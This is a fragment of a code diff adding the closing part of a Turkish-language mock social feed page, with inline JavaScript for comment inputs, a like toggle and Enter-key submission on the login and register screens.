+      <div class="comment-row">
+        <div class="comment-avatar" style="background:${sess.avatar||'#555'}">${sess.name.charAt(0).toUpperCase()}</div>
+        <input class="comment-input" type="text" placeholder="Yorum ekle..."
+               oninput="this.nextElementSibling.style.opacity=this.value.trim()?'1':'0'"
+               onkeydown="if(event.key==='Enter'&&this.value.trim()){this.value='';this.nextElementSibling.style.opacity=0;}"/>
+        <button class="comment-post-btn">Paylaş</button>
+      </div>`;
+    container.appendChild(div);
+  });
+}
+
+function toggleLike(i, base) {
+  liked[i] = !liked[i];
+  document.getElementById(`like-btn-${i}`).classList.toggle('liked', liked[i]);
+  document.getElementById(`likes-${i}`).textContent = (base + (liked[i]?1:0)).toLocaleString('tr-TR') + ' beğeni';
+}
+
+// Enter key support on auth screens
+document.addEventListener('keydown', e => {
+  if (e.key !== 'Enter') return;
+  const active = document.querySelector('.screen.active')?.id;
+  if (active === 'screenLogin')    doLogin();
+  if (active === 'screenRegister') doRegister();
+});
+</script>
+</body>
+</html>
